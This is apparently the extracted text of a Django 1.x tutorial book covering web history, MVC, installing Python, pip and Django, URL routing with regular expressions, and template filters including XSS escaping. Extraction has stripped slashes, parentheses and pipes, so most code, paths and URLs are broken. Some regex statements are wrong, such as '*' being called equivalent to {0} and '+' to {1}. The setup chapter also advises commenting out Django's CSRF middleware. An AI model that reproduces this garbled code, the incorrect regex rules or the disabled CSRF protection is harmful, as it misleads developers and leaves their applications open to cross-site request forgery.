With a growing skills gap, the need for talented developers is  greater than ever before. A basic grounding in building apps with a framework as  minimalistic, powerful, and easy-to-learn as Django will be a useful skill to launch  you on a career as an entrepreneur or web developer.  Django is one of the most popular web frameworks in use today. It powers large  websites, such as Pinterest, Instagram, Disqus, and NASA. With a few lines of code,  you can rapidly build a functional and secure website that can scale to millions   of users.  For some years, web development has evolved through frameworks. Web  development has become more efficient and has improved in quality. Django  is a very sophisticated and popular framework. Django is based on the Python  programming language, where the code is clear and easy to read. Also, Django has  a lot of third-party modules that can be used in conjunction with your own apps.  Django has an established and vibrant community, where you can find source code,  get help, and contribute.  This course is a learning path that uses module-by-module pedagogy to help novice  developers learn how to easily deal with the Django framework. This course will also  provide you a basic grounding in the fundamental concepts of web development  with Python, as well as the hands-on experience in order to successfully build web  applications with Django.  [ i ]   What this learning path covers Module 1, Django Essentials, a practical guide, filled with many real world examples to  build highly effective Django web application. It begins with step-by-step installation  of Python, PIP, and Django on Windows, Linux, and Mac OS.. Module 2, Web Development with Django Cookbook, covers varying complexities to help  you create multilingual, responsive, and scalable websites with Django. Module 3, Django Design Patterns and Best Practices, This module will teach you common  design patterns to develop better Django code. Creating a successful web application  involves much more than Django, so advanced topics including REST, testing,  debugging, security, and deployment are also explored in detail in this module.  What you need for this learning path To develop with Django 1.8, you will need Python 2.7 or Python 3.4, the Pillow  library for image manipulation, the MySQL database and MySQLdb bindings or  PostgreSQL database, virtualenv to keep each project's Python modules separated,  and Git or Subversion for version control.  The other software required for Django development are as follows:     PIP 1.5    Text editor  or a Python IDE     Web browser  the latest version, please   For Module 3, Django Design Patterns and Best Practices, it is recommend to work on a  Linux-based system such as Ubuntu or Arch Linux. If you are on Windows, you can  work on a Linux virtual machine using Vagrant or VirtualBox.   Certain chapters might also require installing certain Python libraries or Django  packages. They will be mentioned as, say—the factory_boy package. In most cases,  they can be installed using pip as follows:   $ pip install factory_boy   Hence, it is highly recommended that you first create a separate virtual environment,  as mentioned in Module 3, Chapter 2, Application Design.  [ ii ]  Preface   Who this learning path is for Web developers who want to use modern Python-based web frameworks like Django  to build powerful web applications. The course is mostly self-contained and introduces  web development with Python to a reader who is familiar with web development  concepts and can help him become an expert in this trade. It's intended for all levels of  web developers, both students and practitioners from novice to experts.  Reader feedback Feedback from our readers is always welcome.

We will learn how to use the Django framework to  create a complete website.  In this chapter, we will discuss the following:     The changes in the Web    A presentation of Django    MVC development pattern  From Web 1.0 to Web 2.0 The Web that you see today has not always been as it appears today. Indeed, many  technologies such as CSS, AJAX, or the new HTML 5 version have improved the Web.  Web 1.0 The Web was born 25 years ago, thanks to growing new technologies. Two of these  have been very decisive:     The HTML language is a display language. It allows you to organize   information with nested tags.     The HTTP protocol is a communication network protocol that allows a client   and a server to communicate. The client is often a browser such as Firefox  or Google Chrome, and the server is very often a web server such as Nginx,  Apache, or Microsoft IIS.   In the beginning, developers used the   tag to organize various elements of  their page as the menu, header, or content. The images displayed on the web pages  were of low resolutions to avoid the risk of making the page heavy. The only action  that users could perform was to click on the hypertext links to navigate to other pages.  These hypertext links enabled users to navigate from one page to another by sending  only one type of data: the URL of the page. The Uniform Resource Locator  URL   defines a unique link to get resources such as an HTML page, picture, or PDF file.   No data other than the URL was sent by the user.  Web 2.0 The term Web 2.0 was coined by Dale Dougherty, O'Reilly Media Company, and   was mediated in October 2004 by Tim O'Reilly during the first Web 2.0 conference.  This new Web became interactive and reachable to beginners. It came as a gift to  many technologies, including the following:     The server-side languages such as PHP, Java Server Page  JSP , or ASP.   These languages allow you to communicate with a database to deliver  dynamic content. This also allows users to send data in HTML forms in   order to process data using the web server.      Databases store a lot of information. This information can be used to   authenticate a user or display an item list from older to more recent entries.    Client-side script such as JavaScript enables users to perform simple tasks  without refreshing the page. Asynchronous JavaScript and XML  AJAX   brings an important feature to the current Web: asynchronous swapping  between the client and the server. Thanks to this, there is no need to refresh  the page in order to enjoy the website.  Today, Web 2.0 is everywhere, and it is a part of our everyday life. Facebook is a  perfect example of a Web 2.0 site, with complete interaction between users and the  storage of massive amounts of information in its database. Web applications have  been popularized as webmails or Google web applications.  It's in this philosophy that Django emerged.  [ 4 ]  Django's Position on the Web   What is Django? Django was born in 2003 in a press agency of Lawrence, Kansas. It is a web framework  that uses Python to create websites. Its goal is to write very fast dynamic websites. In  2005, the agency decided to publish the Django source code in the BSD license. In 2008,  the Django Software Foundation was created to support and advance Django. Version  1.00 of the framework was released a few months later.  Django's slogan The web framework for perfectionists with deadlines.  Django's slogan is explicit. This framework was created to accelerate the development  phase of a site, but not exclusively. Indeed, this framework uses the MVC pattern,  which enables us to have a coherent architecture, as we will see in the next chapter.  Until 2013, Django was only compatible with Python version 2.x, but Django 1.5  released on February 26, 2013, points towards the beginning of Python 3 compatibility.  Today, big organizations such as the Instagram mobile website, Mozilla.org, and  Openstack.org are using Django.  Django – a web framework A framework is a set of software that organizes the architecture of an application and  makes a developer's job easier. A framework can be adapted to different uses. It also  gives practical tools to make a programmer's job faster. Thus, some features that are  regularly used on a website can be automated, such as database administration and  user management.  Once a programmer handles a framework, it greatly improves their productivity   and the code quality.  The MVC framework Before the MVC framework existed, web programming mixed the database access  code and the main code of the page. This returned an HTML page to the user. Even if  we are storing CSS and JavaScript files in external files, server-side language codes are  stored in one file that is shared between at least three languages: Python, SQL,   and HTML.  [ 5 ]  Chapter 1   The MVC pattern was created to separate logic from representation and have an  internal architecture that is more tangible and real. The Model-View-Controller   MVC  represents the three application layers that the paradigm recommends:     Models: These represent data organization in a database. In simple words,  we can say that each model defines a table in the database and the relations  between other models. It's thanks to them that every bit of data is stored in  the database.     Views: These contain all the information that will be sent to the client. They  make views that the final HTML document will generate. We can associate  the HTML code with the views.     Controllers: These contain all the actions performed by the server and are not   visible to the client. The controller checks whether the user is authenticated  or it can generate the HTML code from a template.  The following are the steps that are followed in an application with the MVC pattern:  1.  The client sends a request to the server asking to display a page. 2.  The controller uses a database through models. It can create, read, update,    or delete any record or apply any logic to the retrieved data.  3.  The model sends data from the database; for example, it sends a product list   if we have an online shop.  [ 6 ]  Django's Position on the Web   4.  The controller injects data into a view to generate it. 5.  The view returns its content depending on the data given by the controller. 6.  The controller returns the HTML content to the client.  The MVC pattern enables us to get coherence for each project's worker. In a web  agency where there is a web designer and there are developers, the web designer  is the head of the views. Given that views contain only the HTML code, the web  designer will not be disturbed by the developer's code. Developers edit their models  and controllers.  Django, in particular, uses an MVT pattern. In this pattern, views are replaced by  templates and controllers are replaced by views. In the rest of this book, we will be  using MVT patterns. Hence, our HTML code will be templates, and our Python code  will be views and models.  Why use Django? The following is a nonexhaustive list of the advantages of using Django:     Django is published under the BSD license, which assures that web   applications can be used and modified freely without any problems;   it's also free.     Django is fully customizable. Developers can adapt to it easily by creating   modules or overridden framework methods.     This modularity adds other advantages. There are a lot of Django modules   that you can integrate into Django. You can get some help with other people's  work because you will often find high-quality modules that you might need.    Using Python in this framework allows you to have benefits from all Python   libraries and assures a very good readability.     Django is a framework whose main goal is perfection. It was specifically   made for people who want clear code and a good architecture for their  applications. It totally respects the Don't Repeat Yourself  DRY  philosophy,  which means keeping the code simple without having to copy paste the  same parts in multiple places.     With regards to quality, Django integrates lots of efficient ways to perform   unit tests.     Django is supported by a good community. This is a very important asset   because it allows you to resolve issues and fix bugs very fast. Thanks to the  community, we can also find code examples that show the best practices.  [ 7 ]  Chapter 1   Django has got some disadvantages too. When a developer starts to use a framework,  he  she begins with a learning phase. The duration of this phase depends on the  framework and the developer. The learning phase of Django is relatively short if   the developer knows Python and object-oriented programming.  Also, it can happen that a new version of the framework is published that modifies  some syntax. For example, the syntax of the URLs in the templates was changed   with Version 1.5 of Django.  For more details, visit https:  docs.djangoproject. com en 1.5 ref templates builtins url.  Despite this, the documentation  provides details of each Django update.  Summary In this chapter, we studied the changes that have enabled the Web to evolve into Web  2.0. We also studied the operation of MVC that separates logic from representation.   We finished the chapter with an introduction to the Django framework.  In the next chapter, we will set up our development environment with Python, PIP,  and Django.  [ 8 ]  Django's Position on the Web   Creating a Django Project  At the end of this chapter, you will have all the necessary elements to begin  programming with Django. A website developed with Django is a project that  contains one or more applications. Indeed, when a website becomes more important,  it becomes necessary to logically separate it into several modules. These modules are  then placed in the project that corresponds to the website. In this book, we will not  need to create many applications, but they can be very helpful in some cases. Indeed,   if one day you create an application and you want to use it in another project, you will  need to copy and adapt this application to the new project.  To be able to use Django, you need to install the following software:     Python 3, to enjoy the third version innovations.     setuptools is a module that simplifies the installation of the external   Python module. However, it does not manage to uninstall the module.     PIP extends the possibilities of setuptools by removing packages,    using easier syntax, and providing other benefits.     Django, which that we are going to install thanks to PIP.  These installations will be compatible with Windows, Linux, and Mac OS X.  Installing Python 3 To use all the tools that we have talked about so far, we first need to install   Python 3. The following sections describe how we can install Python on   different operating systems.   Installing Python 3 for Windows To download the Python executable, visit http:  www.python.org download    and download the Python MSI file. Please make sure that you choose the right version  concerning your platform. The Python installation may need an administrator account.  For all the stages of the Python installation, you can leave all the settings at their  default values. If the installation has been done properly, you should see the  following dialog window open:  Installing Python 3 for Linux To set up Python 3 on Linux, we can use the packet manager APT with the   following command:  root@debian:apt-get install python3  Downloading the example code You can download the example code files for all Packt books you have  purchased from your account at http:  www.packtpub.com. If you  purchased this book elsewhere, you can visit http:  www.packtpub. com support and register to have the files e-mailed directly to you.  We need to confirm the modifications proposed by APT.  [ 10 ]  Creating a Django Project   Installing Python 3 for Mac OS The latest version of Mac OS already has a version of Python. However, Version 2   of Python is installed, and we would like to install Version 3. To do this, visit  https:  www.python.org download  and download the right version. Then,   open the file with the extension .dmp. Finally, run the file with the extension .mpkg.  If you get an error such as Python cannot be opened because it is from an  unidentified developer, perform the following steps:  In Finder, locate the Python install.  1.  2.  Press the ctrl key and then click on the app's icon. 3.  Select Open from the shortcut menu. 4.  Click on Open.  Installing setuptools PIP is a dependence of setuptools. We need to install setuptools to use PIP.   The following sections describe how we can install setuptools on different   operating systems.  Installing setuptools for Windows To download the setuptools executable, you have to go to the PyPI website at  https:  pypi.python.org pypi setuptools. Then, we need to click on   Downloads and select the right version. In this book, we use Version 1.1,   as shown in the following screenshot:   Installing setuptools for Linux When using APT, we do not need to install setuptools. Indeed, APT will automatically  install it before installing PIP.  Installing setuptools for Mac OS When we install PIP with the get-pip.py file, setuptools will be directly installed.  Therefore, we do not need to install it for the moment.  [ 11 ]  Chapter 2   Installing PIP PIP is very popular among Python users, and using PIP is a Django community best  practice. It handles the package installation, performs updates, and removes all the  Python package extensions. Thanks to this, we can install all the required packages  for Python.  If you have installed Python 3.4 or later, PIP is included with Python.  Installing PIP for Windows To install PIP, first download it from https:  pypi.python.org pypi pip 1.5.4.  Then, we need to install PIP from the executable, but don't forget to define the right  Python installation folder, as you can see in the following screenshot:  For the next set of steps, go with the default options and complete the installation.  With PIP, we will be installing all the required Python packages.  Installing PIP for Linux To install PIP and all the components including setuptools for Linux, you have to use  the get-pip.py file with the following commands:  root@debian: wget https:  raw.github.com pypa pip master contrib   get-pip.py  root@debian:python3 get-pip.py  [ 12 ]  Creating a Django Project   Installing PIP for Mac OS To install PIP on Mac OS, we must use the get-pip.py file in the following manner:  curl -O https:  raw.github.com pypa pip master contrib get-pip.py   sudo python3 get-pip.py  Installing Django We will then install the framework on which we will be working. The following  sections describe how we can install Django on different operating systems.  Installing Django for Windows To install Django with PIP, you have to open a command prompt and go to the  Scripts directory that you can find in the Python folder. You can install Django  with the following command:  C:\Python33\Scripts\pip.exe install django=="X.X"  PIP will download and install the Django packages in the site-packages repository  of Python.  Installing Django for Linux To facilitate the PIP utilization that we have just installed, we have to look for  the version installed on the system and define an alias to refer to the PIP version  installed. Do not forget to execute the following commands as root:   root@debian:compgen -c  grep pip  root@debian:alias pip=pip-3.2  root@debian:pip install django=="1.6"  The first command looks for a usable command containing the word pip. You will  certainly find a line such as pip-3.2. It's on this command that we will define an  alias with the second command.  The third command installs Version 1.6 of Django.  [ 13 ]  Chapter 2   Installing Django for Mac OS If you want to use PIP more easily, we can create a symbolic link with the   following commands:  cd  usr local bin  ln -s .. .. .. Library Frameworks Python.framework Version 3.3 bin pip3  pip  We can then install Django using the following command:  pip install django=="1.6"  Starting your project with Django Before you start using Django, you need to create an environment for your  applications. We will create a Django project. This project will then contain   our applications.  To create the project of our application, we need to run the following command  using the django-admin.py file  you can find it in the Python33\Scripts folder :  django-admin.py startproject Work_manager  So as to facilitate the use of the Django commands, we can set the environmental  variable of Windows. To do this, you must perform the following steps:  1.  Right-click on My computer on the desktop. 2.  Click on Advanced System Settings. 3.  Next, click on Environmental Variable. 4.  Add or update the PATH variable:          If it does not exist, create the PATH variable and set its value   as C:\Python33 Scripts If it exists, append ;C:\Python33\Scripts to the existing value  5.  Now, you can use the precedent command without the need to put yourself   in the Python33 Scripts folder.  [ 14 ]  Creating a Django Project   There are different ways to perform the previous command:     The following command will be performed in all cases: C:\Python33\python.exe C:\Python33\Scripts  \django-admin.py startproject Work_manager     The following command will be performed if we have defined   C:\Python33\Scripts in the PATH variable: C:\Python33\python.exe django-admin.py startproject  Work_manager     The following command will be performed if we have defined   C:\Python33\Scripts in the PATH variable and the .py  extension file is defined to run with Python: django-admin.py startproject Work_manager  This command creates a Work_manager folder in the folder from where you run the  command. We will find a folder and a file in that folder:     The manage.py file will be used for actions performed on the project such    as starting the development server or synchronizing the database with   the models.     The Work_manager folder represents an application of our project. By default,   the startproject command creates a new application.  The Work_manager folder contains two very important files:     The settings.py file contains the parameters of our project. This file is   common to all our applications. We use it to define the debug mode, configure  the database, or define Django packages that we will use. The settings.py  file allows us to do more things, but our use will be limited to what has been  previously described.     The urls.py file contains all our URLs. It is with this file that we make the   routing in Django. We will cover this in the next chapter.  Creating an application We will not program our application in the Work_manager folder because we want   to create our own Task_manager application.   For this, run the following command using the manage.py file created by   the startproject command You must run the following command in the   Work_manager folder which contains manage.py file:  Manage.py startapp TasksManager  [ 15 ]  Chapter 2   This command creates a TasksManager folder in the folder of our project. This folder  contains five files:     The __ init__.py file defines a package. Python needs it to differentiate   between the standard folders and the packages.     The admin.py file is not useful at this moment. It contains the models that   need to be incorporated in the administration module.     The models.py file contains all the models of our application. We use it a  lot for the development of our application. Models allow us to create our  database and store information. We will discuss this in Chapter 5, Working  with Models.     The tests.py file contains the unit tests of our application.    The views.py file can contain views. This file will contain all the actions   before sending the HTML page to the client.  Now that we know the most important files of Django, we can configure our project.  Configuring the application To configure our project or our application, we need to edit the settings.py file in  the project folder.  This file contains variables. These variables are the settings that Django reads when  initializing the web app. The following are a few of these variables:     DEBUG: This parameter must be set to True throughout the duration of   development because it is the one that enables the errors to be displayed.   Do not forget to set it to False when putting the project into production,  because an error gives very sensitive information about the site security.     TIME_ZONE: This parameter sets the region referring to which it must   calculate dates and times. The default is UTC.     DEFAULT_CHARSET: This sets the character encoding used. On the    task_manager application, we use UTF-8 encoding to simplify  internationalization. To do this, you must add a line as follows: DEFAULT_CHARSET = 'utf-8'     LANGUAGE_CODE: This sets the language to be used on the website.    This is the main useful parameter for internationalization.     MIDDLEWARE_CLASSES: This defines the different middleware used.  [ 16 ]  Creating a Django Project   Middleware are classes and methods, including the methods that are performed  during the request process. To simplify the beginning of the development, we will  remove a middleware from that parameter. This requires you to comment out the  line by adding  in front of it:   'django.middleware.csrf.CsrfViewMiddleware',  We'll talk about this middleware in a later chapter to explain its operation   and importance.  Now that we have seen the general settings of Django, we can start developing   our application.  Summary In this chapter, we have installed all the software needed to use Django. In this chapter,  we learned how to create a Django project and an application. We also learned how to  configure an application.  In the next chapter, we will start the Django development with an example of a web  page containing the text Hello World!.  [ 17 ]  Chapter 2    Hello World! with Django  In this chapter, we will not actually start with the development phase. Instead, we  will study the basics of websites to learn Django, namely, the project and application  creation. In this chapter, we will also:     Learn how to use regular expressions    Create your first URLs    Create your first view    Test your application  At the end of the chapter, we will have created our first web page that will display  Hello World!.  Routing in Django In the previous chapter, we edited the settings.py file to configure our Django  project. We will edit settings.py again to add a new parameter. The following   line must be present in settings.py:  ROOT_URLCONF = 'Work_manager.urls'  This parameter will define the Python file that will contain all the URLs of our site.  We have already spoken about the previous file as it is in the Work_manager folder.  The syntax that is used to define the ROOT_URLCONF variable means that Django takes  the URLs in the urls.py file contained in the Workmanager package to the root of   the project.  The routing of our application will be based on this file. The routing defines how the  client request will be treated based on the URL sent.  In fact, when the controller receives the client request, it will go in the urls.py file  and check whether the URL is a customer's request and use the corresponding view.   For example, in the following URL, Django will look for the search string in   urls.py to know what action to take: http:  localhost search.  This is what the urls.py file looks like, as it is created by Django when creating   the project:  from django.conf.urls import patterns, include, url from django.contrib import admin admin.autodiscover   urlpatterns = patterns '',      Examples:      url r'^$', 'Work_msanager.views.home', name='home' ,      url r'^blog ', include 'blog.urls'  ,     url r'^admin ', include admin.site.urls  ,    We will detail the components of this file:     The first line imports the functions commonly used in the management    of URLs.     The next two lines are useful to the administration module. We will comment   by adding  at the beginning of the line. These lines will be explained in a  later chapter.     The remaining lines define the URLs in the urlpatterns variable. We will   also review the URL starting with url  r '^ admin.  After having received a request from a web client, the controller goes through the  list of URLs linearly and checks whether the URL is correct with regular expressions.  If it is not in conformity, the controller keeps checking the rest of the list. If it is in  conformity, the controller will call the method of the corresponding view by sending  the parameters in the URL. If you want to write URLs, you must first know the basics  of regular expressions.  [ 20 ]  Hello World! with Django   Regular expressions Regular expressions are like a small language in itself. Despite their complex and  inaccessible air, they can manipulate the strings with great flexibility. They comprise  a sequence of characters to define a pattern.  We will not explore all the concepts of regular expressions in this book, because it  would require several chapters and divert us from the main goal of this book. Practice  your regular expressions before you write your first URLs; many sites help you train  on regular expressions. Search for Online regex matcher, and you will find pages  to check your regular expressions through JavaScript. You can further explore regular  expressions through the book, Mastering Regular Expressions Python, Packt Publishing,  written by Félix López. There is a practical tool to visualize regular expressions. This  tool is called Regexper and was created by Jeff Avallone. We will use this to represent  regular expressions as a diagram.  The following sections explore the patterns used, functions, and an example to help  you understand regular expressions better.  The uninterpreted characters Uninterpreted characters, such as letters and digits, in a regular expression mean that  they are present in the string and must be placed in exactly the same order.  For example, the regular expression test01 will validate the test01, dktest01,   and test0145g strings but won't validate test10 or tste01.  The regular expression test-reg will validate a test-regex but not test-aregex  or testregex:  A visual representation of the test01 regular expression  The beginning and the end of the line To check whether a string must be present at the beginning or the end of the line,  you must use the ^ and $ characters. If ^ is present at the beginning of the string,   the validation will be done at the beginning of the chain. It works in the same way  for $ at the end.  [ 21 ]  Chapter 3   The following are some examples:     The ^test regular expression will validate test and test01l but not dktest   or ttest01:  test01:     The regular expression test$ will validate test and 01test, but not      The regular expression ^test$ will only validate test:  The any character regular expression In a regular expression, the dot  .  means "any character". So, when you validate  characters that cannot be inferred, the dot is used. If you try to validate a dot in   your speech, use the escape character, \.  The following are examples:      ^te.t validates test or tept:     ^test\.me$ only validates test.me:  Character classes To validate the characters, you can use character classes. A character class is enclosed  in square brackets and contains all the allowed characters. To validate all the numbers  and letters in a location, you must use [0123456789a]. For example, ^tes[t0e]$ will  only validate the three chains: test, tes0, and tese.  [ 22 ]  Hello World! with Django   You can also use the following predefined classes:     [0-9] is equivalent to [0123456789]    [a-z] matches all the letters, [abcdefghijklmnopqrstuvwxyz]    [A-Z] matches all uppercase letters    [a-zA-Z] matches all the letters  The following are the shortcuts:     \d is equivalent to [0-9]    \w is equivalent to [a-zA-Z0-9_]    [0-9] is equivalent to [0123456789]  Validating the number of characters Everything that we have studied until now is the elements that define one and   only one character. To validate a character one or more times, you must use braces  {x, y}, where x defines the minimum number of occurrences and y is the maximum  number of occurrences. If one of them is not specified, you will have an undefined  value. For example, if you forget to include an element in {2,}, it means that the  character must be present at least twice.  The following are some examples:     ^test{2, 3}$ only validates testt and testtt:     ^tests{0,1}$ only validates test and tests     . ^ {1} $ validates all the channels except one: the empty string  The following are the shortcuts:     * is equivalent to {0}    ? is equivalent to {0, 1}    + is equivalent to {1}  [ 23 ]  Chapter 3   Regular expressions are very powerful and will be very useful even outside of  programming with Django.  Creating our first URL One of the interesting features of Django is to contain a development server. Indeed,  during the development phase of the site, the developer does not need to set up a  web server. However, when you put the site into production, you will need to install  a real web server because it is not for use in production.  Indeed, the Django server is not secure and can hardly bear a heavy load. This does  not mean that your site will be slow and full of flaws; it just means that you have to  go through a real web server into production.  To use the development server, we need to use the manage.py runserver command  file. We must launch the command prompt and put ourselves in the project root    use the cd command to browse folders  to execute the command:  manage.py runserver 127.0.0.1:8000  This command starts the Django development server. Let's explain the control step  by step:     The runserver parameter starts the development server.    127.0.0.1 is our internal IP address to the network adapter. This means   that our server will listen and respond only to the computer on which it   is launched. If we were in a local network and wanted to make our website  available on computers other than ours, we would enter our local IP   address instead of 127.0.0.1. The value 127.0.0.1 is the default value   of the parameter.     8000 defines the listening port of the server. This setting is useful to run   multiple web servers on a single computer.  If the command is executed correctly, the window should show us the message, 0  errors found, as shown in the following screenshot:  [ 24 ]  Hello World! with Django   To see the result, we must open our browser and enter the following URL:   http:  localhost:8000.  Django confirms that our development environment is functional by displaying the  following message:  This message also means that we have no specified URL. We will add two URLs   to our file:   url  r'^$', 'TasksManager.views.index.page ,   url  r'^index$', 'TasksManager.views.index.page'    You should consistently get to know about bugs in Django, especially  on the GitHub page for Django: https:  github.com django.  In the URLs that we enter, we define the first parameter  regular expression  that will  validate the URL. We will discuss the second argument in the following chapter. Let's go back to our browser and refresh the page with the F5 key. Django will  display a ViewDoesNotExist at   error.  This means that our module does not exist. You must study your errors; in this  example, we had an error. With this error, we will directly fix the part that does   not work.  Another problem that we regularly encounter is the 404 Page not found error.   We can generate it by typing the http:  localhost:8000 test404 URL in our  browser. This error means that no URL has been validating the test404 string.   [ 25 ]  Chapter 3   We must pay attention to errors because seeing and resolving them can save us a lot  of time.  Creating our first view Now that we have created our URL and interpreted by the routing system,   we must ensure that a view  which is a controller in the MVC pattern  meets   the customer's demand.  This is the function of the second parameter of the URLs present in urls.py.   This parameter will define the method that will play the role of a view. Take,   for example, our first URL:   url  r'^$', 'TasksManager.views.index.page' ,   Firstly, as we have seen when studying regular expressions, this URL will be valid  only if we browse the http:  localhost:8000 URL. The second parameter in the  URL means that in the index.py file, there is a method called page that will process  the request. The index.py file is located in the views package at the root of the  TasksManager application.  When we want a folder to be recognized as a package by Python, we need to create   a folder that contains the __init__.py file that we can leave blank.  You can choose another structure to store your views. You must choose the structure  that best fits your project. Have a long-term vision of your project in order to define  quality architecture from the first line of code.  In our index.py file, we will create a method called page  . This method will return  an HTML page to the client. The page is being returned by the HTTP protocol, so  we will use the HttpResponse   function and its importation. The argument of  this HttpResponse   function returns the HTML content that we will return to the  browser. To simplify reading this example, we do not use a proper HTML structure,  because we just return Hello world! to the client, as shown in the following code:   - * - Coding: utf -8 - * - from django.http import HttpResponse  View for index page. def page  request  :  return HttpResponse  "Hello world!"    As we can see in the previous example, we added a comment before our page    method. Comments are very important. They help you understand your code   very quickly.  [ 26 ]  Hello World! with Django   We also set the encoding of the UTF-8 characters. This will improve our application's  compatibility with other languages. We do not necessarily indicate it later in the  book, but it is advisable to use it.  Testing our application To test our first page, we will have to use the runserver command, which we saw  earlier in this chapter. To do this, you must run the command and refresh your page,  http:  localhost:8000, in your browser.  If you see Hello World! appear in your browser without an error, it means that you  have followed the previous steps. If you have forgotten something, do not hesitate to  find your error on the Internet; others have probably been through the same.  However, we must improve our view because at the moment, we do not respect the  MVC model. We will create a template to separate the HTML of Python code and  have more flexibility.  Summary In this chapter, we studied the basics of regular expressions. It is a powerful tool to  use to manipulate strings. We learned how to manipulate the system routing URL.  We also created our first view that returns a string to the client. In the next chapter,  we will learn how to create maintainable templates with Django.  [ 27 ]  Chapter 3    Working with Templates  As we saw in the first chapter, where we explained the MVC and MVT models,  templates are files that will allow us to generate the HTML code returned to the  client. In our views, the HTML code is not mixed with the Python code.  Django comes with its own template system. However, as Django is modular, it is  possible to use a different template system. This system is composed of a language  that will be used to make our dynamic templates.  In this chapter, we will learn how to do the following:     Send data to a template    Display data in a template    Display object lists in a template    Handle chains with filters in Django    Use URLs effectively    Create base templates in order to extend other templates     Insert static files in our templates  Displaying Hello world! in a template We will create the first template of our application. To do so, we must first edit   the settings.py file to define the folder that will contain our templates. We will   first define the project folder as PROJECT_ROOT to simplify the migration to another  system:  PROJECT_ROOT = os.path.abspath os.path.dirname __file__   TEMPLATE_DIRS =      os.path.join PROJECT_ROOT, '.. TasksManager templates' ,    Put strings here, like " home html django_templates" or "C: www  django templates".      Always use forward slashes, even on Windows.    Don't forget to use absolute paths, not relative paths.    Now that Django knows where to look for the templates, we will create the first  template of the application. To do this, use a file browser and add the index.html   file in the TasksManager templates en public  folder. We do not need to create   the __init__.py file, because these files do not contain any Python files.  The following is the content of the index.html file:                    Hello World Title                           Hello World Django                   Hello world !              Although the template is correct, we need to change the view to indicate its use. We  will modify the index.py file with the following content:  from django.shortcuts import render  View for index page.  def page request :   return render request, 'en public index.html'   If we test this page, we will notice that the template has been taken into account by  the view.  [ 30 ]  Working with Templates   Injecting the data from the view to the  template Before improving our template, we must send variables to the templates. The injection  of the data is based on these variables, as the template will perform certain actions.  Indeed, as we have seen in the explanation of the MVC pattern, the controller must  send variables to the template in order to display them.  There are several functions to send variables to the template. The two main functions  are render   and render_to_response  . The render   function is very similar to  render_to_response   . The main difference is that if we use render, we do not  need to specify context_instance = RequestContext request  in order to send  the current context. This is the context that will allow us to use the CSRF middleware  later in the book.  We will change our view to inject variables in our template. These variables will be  useful to work with the template language. The following is our modified view:  from django.shortcuts import render """ View for index page.  """  def page request :   my_variable = "Hello World !"   years_old = 15   array_city_capitale = [ "Paris", "London", "Washington" ]   return render request, 'en public index.html', { "my_var":my_ variable, "years":years_old, "array_city":array_city_capitale }   Creating dynamic templates Django comes with a full-template language. This means that we will use template  tags that will allow us to have more flexibility in our templates and display variables,  perform loops, and set up filters.  The HTML and template languages are mixed in the templates; however, the template  language is very simplistic, and there is a minority when compared to the HTML code.  A web designer will easily modify the template files.  [ 31 ]  Chapter 4   Integrating variables in templates In our controller, we send a variable named my_var. We can display it in a     tag in the following way. Add the following lines in the   tag of our   template tag:    {{my_var}}     In this way, because our variable contains string = "Hello World!", the HTML  code that will be generated is as follows:     Hello World!    We will learn how to create conditions for variables or functions in order to filter the  data in the variables in the following examples.  Conditional statements Language templates also allow conditional structures. Note that for a display  variable, double brackets {{}} are used, but once we have an action to be made   as a condition or loop, we will use {%%}.  Our controller sends a years variable that can define age. An example of a conditional  structure is when you can change the value of the variable in the controller to observe  the changes. Add the following code in our   tag:      {% if years < 10 %}     You are a child   {% elif years < 18 %}     You are a teenager   {% else %}     You are an adult!   {% endif %}    In our case, when we send the value 15 to the generated template, the code that is  used is as follows:    You are a teenager    Looping in a template Looping allows you to read through the elements of a table or data dictionary. In our  controller, we sent a data table called array_city in which we have the names of  cities. To see all these names of cities in the form of a list, we can write the following  in our template:  [ 32 ]  Working with Templates       {% for city in array_city %}             {{ city }}         {% endfor %}         Paris     London     Washington     This looping will go through the array_city table, and place each element in the  city variable that we display in the   tag. With our sample data, this code will  produce the following HTML code:  Using filters Filters are an effective way to modify the data before sending it to the template.   We will look at some examples of filters in the following sections to understand   them better.  The upper and lower filters The lower filter converts into lowercase letters, and the upper filter converts   into uppercase letters. The example given in the subsequent sections contains   the my_hello variable, which equals Hello World!  The lower filter The code for the lower filter is as follows:    {{ my_hello  lower }}    This code generates the following HTML code:    hello world!    The upper filter The code for the upper filter is as follows:    {{ my_hello  upper }}    [ 33 ]  Chapter 4   This code generates the following HTML code:    HELLO WORLD!    The capfirst filter The capfirst filter transforms the first letter to uppercase. The example with the  myvar = "hello" variable is as follows:   {{ my_hello  capfirst }}   This code generates the following HTML code:    Hello World!    The pluralize filter The pluralize filter can easily handle plurals. Often, developers choose a simple  solution for lack of time. The solution is to display channels: You have 2 products   in your cart.  Django simplifies this kind of string. The pluralize filter will add a suffix to the end  of a word if the variable represents a plural value, shown as follows:  You have {{ product }} nb_products {{ nb_products  pluralize }} in  our cart.  This channel will show the following three channels if nb_products is 1 and 2:  You have 1 product in our cart. You have 2 products in our cart. I received {{ nb_diaries }} {{ nb_diariespluralize : "y , ies "}}.  The previous code will show the following two chains if nb_diaries is 1 and 2:  I received one diary. I received two diaries.  In the previous example, we used a filter that takes arguments for the first time.   To set parameters to a filter, you must use the following syntax:  {{ variable  filter:"parameters" }}  This filter helps to increase the quality of your site. A website looks much more  professional when it displays correct sentences.  [ 34 ]  Working with Templates   The escape and safe to avoid XSS filters The XSS filter is used to escape HTML characters. This filter helps prevent from XSS  attacks. These attacks are based on injecting client-side scripting by a hacker. The  following is a step-by-step description of an XSS attack:     The attacker finds a form so that the content will be displayed on another   page, for example, a comment field of a commercial site.     The hacker writes JavaScript code to hack using the tag in this form.    Once the form is submitted, the JavaScript code is stored in the database.     The victim views the page comments and JavaScript runs.  The risk is more important than a simple alert   method to display a message. With  this type of vulnerability, the hacker can steal session IDs, redirect the user to a spoofed  site, edit the page, and so on.  More concretely, the filter changes the following characters:  We can automatically escape the contents of a block with the {% autoescape %}  tag, which takes the on or off parameter. By default, autoescape is enabled, but note  that with older versions of Django, autoescape is not enabled.  When autoescape is enabled, if we want to define a variable as a variable of trust,   we can filter it with the safe filter. The following example shows the different  possible scenarios:     < is converted to &lt;    > is converted to &gt;    ' is converted to &39;    " is converted to &quot;    & is converted to &amp;      {% autoescape on %}          {{ variable1 }}                        {{ variable2safe }}               {% endautoescape %}       {% autoescape off %}            [ 35 ]  Chapter 4        {{ variable3 }}       {{ variable4escape }}    {% endautoescape %}    {{ variable5 }}     In this example:     variable1 is escaped by autoescape    variable2 is not escaped as it was filtered with safe    variable3 is not escaped because autoescape is defined as off    variable4 is escaped because it has been filtered with the escape filter    